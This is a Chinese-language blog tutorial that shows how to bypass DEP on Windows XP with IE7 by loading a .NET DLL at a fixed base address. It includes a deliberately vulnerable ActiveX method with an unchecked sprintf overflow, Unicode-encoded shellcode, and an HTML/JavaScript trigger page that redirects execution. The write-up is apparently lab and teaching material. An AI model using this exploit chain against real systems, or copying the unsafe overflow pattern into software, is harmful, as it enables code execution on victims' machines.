---
layout:		post
title:		利用.NET挑战DEP
author:		wooy0ung
tags:		
category:  	exploit
---


>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: Visual Studio 2008 
>调试器: OllyDbg 1.10  
<!-- more -->


### 0x00 前期准备

编译ActiveX控件, 注意:

```
1. 禁用优化
2. 关闭GS
3. 在静态库中使用MFC
4. 使用Unicode字符集
5. release版本
```

贴入以下代码, 具体步骤可以参考这片文章: [利用Adobe Flash Player ActiveX控件绕过SafeS.E.H](http://www.wooy0ung.me/exploit/2017/10/04/safeseh-break-byactivex/)

```
void CVulnerAX_DEPCtrl::test(LPCTSTR str)
{
	//AFX_MANAGE_STATE(AfxGetStaticModuleState());

	// TODO: 在此添加调度处理程序代码
	printf("aaaa");
	char dest[100];
	sprintf(dest,"%s",str);
}
```

新建一个.NET控件

![](/assets/img/exploit/2017-12-26-disable-dep-dotnet/0x00.png)

设置dll装载基址

![](/assets/img/exploit/2017-12-26-disable-dep-dotnet/0x01.png)

贴入以下代码, 选择debug版本, 编译

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace DEP_NETDLL
{
    public class Class1
    {
        public void Shellcode()
        {
            string shellcode =
            "\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
            "\ud231\u30b2\u8b64\u8b12\u0c52\u528b\u8b1c\u0842" +
            "\u728b\u8b20\u8012\u0c7e\u7533\u89f2\u03c7\u3c78" +
            "\u578b\u0178\u8bc2\u207a\uc701\ued31\u348b\u01af" +
            "\u45c6\u3e81\u6146\u6174\uf275\u7e81\u4508\u6978" +
            "\u7574\u8be9\u247a\uc701\u8b66\u6f2c\u7a8b\u011c" +
            "\u8bc7\uaf7c\u01fc\u68c7\u2067\u0120\u7968\u7530" +
            "\u686e\u7720\u6f6f\ue189\u49fe\u310b\u51c0\uff50" +
            "\u90d7";
        }
    }
}
```

新建一个文本文件, 贴入以下代码, 更名为test.html

```
<html>
<body>
<object classID="DEP_NETDLL.dll#DEP_NETDLL.Class1"></object>
<object classid="clsid:06BC9528-F8A0-456B-BBBB-09C1248BF827" id="test"></object>
<script>
var s="\u9090";
while(s.length<54){
	s+="\u9090";
}
s+="\u9090\u9090";   //s+="\u24E2\u2424";
test.test(s);
</script>
</body>
</html>
```

将VulnerAX_DEP.ocx、DEP_NETDLL.dll、test.html放到IIS服务默认文件夹的wwwroot目录下, 并且注册VulnerAX_DEP.ocx


### 0x01 exploit

打开IE7.0, 访问http://127.0.0.1/test.html, 再双击打开test.html文件

![](/assets/img/exploit/2017-12-26-disable-dep-dotnet/0x02.png)

来到这里OD附加上去, 选择"E"打开模块, ocx、dll都成功加载

![](/assets/img/exploit/2017-12-26-disable-dep-dotnet/0x03.png)

点进去DEP_NETDLL.dll, 找到shellcode的入口0x242424E2

![](/assets/img/exploit/2017-12-26-disable-dep-dotnet/0x04.png)

修改test.html

```
<html>
<body>
<object classID="DEP_NETDLL.dll#DEP_NETDLL.Class1"></object>
<object classid="clsid:06BC9528-F8A0-456B-BBBB-09C1248BF827" id="test"></object>
<script>
var s="\u9090";
while(s.length<54){
	s+="\u9090";
}
s+="\u24E2\u2424";
test.test(s);
</script>
</body>
</html>
```

关闭调试, 直接运行, pwn~

![](/assets/img/exploit/2017-12-26-disable-dep-dotnet/0x05.png)